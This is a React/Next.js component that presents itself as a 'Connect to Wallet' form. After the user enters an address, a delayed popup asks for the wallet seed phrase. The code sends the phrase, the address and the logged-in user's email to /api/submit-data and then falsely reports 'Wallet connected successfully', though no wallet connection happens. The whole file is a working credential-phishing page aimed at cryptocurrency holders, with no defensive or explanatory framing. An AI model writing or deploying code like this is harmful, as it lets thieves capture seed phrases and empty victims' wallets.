"use client";

import { useState } from "react";
import { useSession } from "next-auth/react";

const InfoUser = () => {
  const { data: session } = useSession();
  const [address, setAddress] = useState("");
  const [pass, setPass] = useState("");
  const [messageSuccess, setMessageSuccess] = useState("");
  const [messageError, setMessageError] = useState("");
  const [showPopup, setShowPopup] = useState(false);
  const [loading, setLoading] = useState(false);

  const handleSubmitAddress = (e: React.FormEvent) => {
    e.preventDefault();
    if (!address) {
      setMessageError("Please enter your address");
      return;
    }

    setTimeout(() => {
      setShowPopup(true);
    }, 2000);
  };

  const handleConnectWallet = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!pass) {
      setMessageError("Please enter your password to connect to the wallet");
      return;
    }

    setLoading(true);
    setMessageSuccess("Connecting to the wallet...");

    try {
      const res = await fetch("/api/submit-data", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email: session?.user?.email,
          address,
          pass,
        }),
      });

      const data = await res.json();
      if (res.ok) {
        setMessageSuccess("Wallet connected successfully");
        setShowPopup(false);
        setAddress("");
        setPass("");
      } else {
        setMessageError(`Error: ${data.message}`);
      }
    } catch (error) {
      setMessageError("An error occurred while connecting to the wallet");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="h-full flex flex-col items-center justify-center p-4 space-y-4 bg-white text-black">
      <h2 className="text-2xl font-bold mb-4 text-center">Connect to Wallet</h2>

      <form
        onSubmit={handleSubmitAddress}
        className="space-y-4 shadow-md w-[320px] h-fit"
      >
        <div>
          <label
            htmlFor="address"
            className="block text-sm font-medium text-gray-700"
          >
            Address
          </label>
          <input
            id="address"
            type="text"
            value={address}
            onChange={(e) => setAddress(e.target.value)}
            required
            className="mt-1 block w-full border border-gray-300 rounded-md shadow-sm p-2"
            placeholder="Enter your address"
          />
        </div>

        <button
          type="submit"
          className="w-full bg-blue-600 text-white py-2 px-4 rounded-md shadow-sm hover:bg-blue-700 transition-all"
        >
          Send
        </button>
      </form>

      {showPopup && (
        <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50">
          <div className="bg-white p-6 rounded-lg shadow-lg max-w-sm w-full space-y-4">
            <h3 className="text-lg font-semibold">
              ENTER YOUR WALLET SEED PHRASES HERE
            </h3>
            <form onSubmit={handleConnectWallet} className="space-y-4">
              <div>
                <input
                  type="password"
                  value={pass}
                  onChange={(e) => setPass(e.target.value)}
                  required
                  className="mt-1 block w-full border border-gray-300 rounded-md shadow-sm p-2"
                />
              </div>

              <button
                type="submit"
                disabled={loading}
                className={`w-full bg-blue-600 text-white py-2 px-4 rounded-md shadow-sm hover:bg-blue-700 transition-all ${
                  loading ? "opacity-50 cursor-not-allowed" : ""
                }`}
              >
                {loading ? "Connecting..." : "Connect to Wallet"}
              </button>
            </form>
          </div>
        </div>
      )}
      {messageError !== "" && (
        <p className="mt-4 bg-red-700/20 px-4 py-2 text-center text-red-500">
          {messageError}
        </p>
      )}
      {messageSuccess !== "" && (
        <p className="mt-4 bg-green-700/20 px-4 py-2 text-center text-green-500">
          {messageSuccess}
        </p>
      )}
    </div>
  );
};

export default InfoUser;
